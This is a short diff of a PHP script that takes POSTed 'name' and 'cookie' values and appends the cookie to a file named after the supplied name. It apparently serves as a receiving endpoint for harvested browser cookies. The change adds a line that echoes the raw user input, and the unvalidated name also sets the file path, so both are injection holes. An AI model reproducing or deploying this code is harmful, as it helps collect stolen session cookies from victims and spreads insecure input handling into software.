@@ -17,6 +17,7 @@
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
 $fifo = fopen($name.'.txt', 'a');
+echo $name;
 fwrite($fifo, '----------- ['.$name.'] -----------\n'.$cookie.'\n---------- [END] -----------');
 fclose($fifo);
 ?>
